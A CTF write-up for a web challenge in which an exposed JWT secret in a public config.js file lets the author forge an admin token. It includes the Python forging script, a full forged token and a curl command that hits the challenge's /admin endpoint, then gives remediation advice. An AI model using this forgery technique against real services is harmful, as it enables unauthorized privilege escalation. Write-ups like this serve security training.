# IntraDesk Console - CTF Writeup

## Challenge Overview
- **Name:** IntraDesk Console
- **Category:** Web Security
- **URL:** http://13.53.139.173/web2/

## Summary

| Item | Value |
|------|-------|
| **Vulnerability** | JWT Secret Key Exposure + Role Escalation |
| **Flag** | `flag{jwt_role_esc4lation_w0rks}` |

---

## Detailed Walkthrough

### Step 1: Initial Reconnaissance

Upon accessing the web application, I found an IntraDesk Console login page with the following components:

1. **Login Form** - Accepts a username and generates a session token
2. **Quick Links** - Listed several endpoints:
   - `/dashboard` (requires token)
   - `/admin` (admin only)
   - `/static/config.js` (frontend config)

### Step 2: Discovering the Vulnerability

I examined the `/static/config.js` file and found critical sensitive information exposed:

```javascript
// IntraDesk frontend config (CTF)
// NOTE: This file should not be public in real deployments.
window.INTRADESK_JWT_SECRET = "intra-2026-dev-key";
window.INTRADESK_COOKIE = "session";
window.INTRADESK_ALG = "HS256";
```

This exposed:
- **JWT Secret Key:** `intra-2026-dev-key`
- **Algorithm:** HS256
- **Cookie Name:** `session`

### Step 3: Understanding the Token Structure

I logged in as a guest user and received a JWT token. Decoding this token revealed:

**Header:**
```json
{
  "alg": "HS256",
  "typ": "JWT"
}
```

**Payload:**
```json
{
  "user": "guest",
  "role": "user",
  "iat": 1769012771,
  "exp": 1769013671
}
```

The `role` field caught my attention - it was set to `"user"` for guest accounts.

### Step 4: Forging an Admin Token

With the secret key exposed, I could forge my own JWT token with elevated privileges:

```python
import jwt
import time

secret = "intra-2026-dev-key"

payload = {
    "user": "admin",
    "role": "admin",    # Escalated to admin role
    "iat": int(time.time()),
    "exp": int(time.time()) + 3600
}

admin_token = jwt.encode(payload, secret, algorithm="HS256")
```

**Forged Token:**
```
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoiYWRtaW4iLCJyb2xlIjoiYWRtaW4iLCJpYXQiOjE3NjkwMTI3OTksImV4cCI6MTc2OTAxNjM5OX0.l3PdyxyfH3bLtrGQbEueExyNrZobod5Zx1pergy3FD4
```

### Step 5: Accessing the Admin Area

Using the forged JWT token as a session cookie, I accessed the `/admin` endpoint:

```bash
curl -b "session=<forged_token>" http://13.53.139.173/web2/admin
```

The server responded with:
- **"Admin access granted."**
- **Flag revealed**

---

## Flag

```
flag{jwt_role_esc4lation_w0rks}
```

---

## Vulnerabilities Identified

### 1. Sensitive Information Disclosure (CWE-200)
The JWT secret key was exposed in a publicly accessible JavaScript configuration file (`/static/config.js`).

### 2. Improper Access Control (CWE-284)
The application relied solely on the JWT token for authorization without any server-side validation of the user's actual privileges.

### 3. Insecure JWT Implementation
Using a weak/hardcoded secret key and exposing it to clients allows token forgery attacks.

---

## Remediation Recommendations

1. **Never expose JWT secrets** - Keep cryptographic secrets server-side only
2. **Use strong, randomly generated secrets** - The secret should be cryptographically random and sufficiently long
3. **Implement server-side role validation** - Don't rely solely on JWT claims for authorization
4. **Consider asymmetric algorithms** - Use RS256/ES256 where the private key never needs to be shared
5. **Implement token revocation** - Have a mechanism to invalidate compromised tokens

---

## Tools Used

- `curl` - HTTP requests
- Python `pyjwt` library - JWT token manipulation

## Files

- `exploit.py` - Automated exploit script
- `writeup.md` - This writeup

---

*Challenge solved as part of UCL/KCL CTF*
